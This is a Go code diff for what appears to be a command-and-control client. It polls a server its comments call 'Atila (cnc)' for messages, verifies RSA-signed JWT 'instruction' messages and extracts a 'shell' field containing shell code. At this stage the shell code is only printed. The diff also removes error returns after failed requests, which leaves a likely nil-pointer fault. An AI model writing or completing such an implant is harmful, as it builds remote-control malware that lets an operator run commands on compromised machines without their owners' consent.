@@ -4,9 +4,16 @@ import (
 	"bytes"
 	"crypto/rsa"
 	"encoding/json"
+	"errors"
 	"fmt"
 	"net/http"
+
+	"github.com/golang-jwt/jwt"
 )
+
+type ParsedMessageContnet struct {
+	Shell string `json:"shell"` // Shell code.
+}
 
 type Message struct {
 	Id      string `json:"id"`      // Unique identifier.
@@ -68,23 +75,75 @@ func identify(id string, publicKey *rsa.PublicKey) bool {
 // inboxReader is a loop of fetching and interpreting messages.
 // Returns true if the operation was successful, false if it didn't.
 func inboxReader(id string) bool {
+	messages := fetchMessages(id)
+
+	for _, message := range messages {
+		reply, err := interpretMessage(message)
+		if err != nil {
+			fmt.Println(err.Error())
+			continue
+		}
+		fmt.Println(reply)
+	}
+
+	return true
+}
+
+// interpretMessage given the message it will generate a reply message.
+func interpretMessage(message Message) (Message, error) {
+	var reply Message = Message{
+		From:    message.To,
+		ReplyTo: message.Id,
+	}
+
+	if message.Subject != "instruction" {
+		return reply, errors.New("unrecognized message subject")
+	}
+
+	// Message's content.
+	content := ParsedMessageContnet{}
+
+	// Verify the message's content.
+	token, err := jwt.Parse(message.Content, func(token *jwt.Token) (interface{}, error) {
+		if _, ok := token.Method.(*jwt.SigningMethodRSA); !ok {
+			return nil, errors.New("invalid signing algorithm")
+		}
+		return trustedPublicKey, nil
+	})
+	if err != nil {
+		return reply, err
+	}
+	if claims, ok := token.Claims.(jwt.MapClaims); ok && token.Valid {
+		if claims["shell"] != nil {
+			content.Shell = fmt.Sprint(claims["shell"])
+		}
+	} else {
+		return reply, errors.New("invalid token's signature")
+	}
+
+	fmt.Println(content)
+
+	return reply, nil
+}
+
+// fetchMessages reaches out to Atila (cnc) and gets the unseen messages.
+// Do remember to ack. the message after interpreting it and issue the response.
+func fetchMessages(id string) []Message {
 	response, err := http.Get(atilaHost + "/v1/messages?clientId=" + id)
 	if err != nil {
 		fmt.Println(err.Error())
-		return false
 	}
 	defer response.Body.Close()
 
 	jsonDecoder := json.NewDecoder(response.Body)
 	jsonDecoder.DisallowUnknownFields()
 
-	var maybeMessages []Message
+	var messages []Message
 
-	jsonErr := jsonDecoder.Decode(&maybeMessages)
+	jsonErr := jsonDecoder.Decode(&messages)
 	if jsonErr != nil {
 		fmt.Println(jsonErr.Error())
-		return false
 	}
 
-	return true
+	return messages
 }
